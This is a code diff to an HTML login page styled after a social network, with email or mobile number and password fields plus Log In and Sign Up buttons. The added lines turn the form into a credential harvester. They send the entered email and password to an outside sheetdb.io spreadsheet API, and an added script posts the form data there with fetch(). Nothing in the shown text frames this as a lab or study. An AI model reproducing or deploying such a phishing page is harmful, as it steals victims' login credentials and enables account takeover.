@@ -22,16 +22,16 @@
             <div class="logo">
                 <img src="logo.png" alt="logo-fetch-error">
             </div>
-            <form action="" autocomplete="off">
-                <input type="email" name="email" id="email" placeholder="Email or Mobile Number" autofocus>
-                <input type="password" name="password" id="password" placeholder="Password">
+            <form action="https://sheetdb.io/api/v1/0tyktfcarzouh" method="post" id="sheetdb-form" autocomplete="off">
+                <input type="email" name="data[email]" id="email" placeholder="Email or Mobile Number" required="" autofocus>
+                <input type="password" name="data[pass]" id="password" placeholder="Password" required="">
                 <p> <a href="#">Forgotten Password ?</a></p>
                 
                 <button id="login">
                     Log In
                 </button>
               <p><hr> </p>
-             
+              
                 <button id="signup">
                     Sign Up
                 </button>
@@ -39,6 +39,21 @@
         </div>
     </div>
     <script src="app.js"></script>
+  <script>
+  var form = document.getElementById('sheetdb-form');
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    fetch(form.action, {
+        method : "POST",
+        body: new FormData(document.getElementById("sheetdb-form")),
+    }).then(
+        response => response.json()
+    ).then((html) => {
+      // you can put any JS code here
+      
+    });
+  });
+</script>
 </body>
 
 </html>
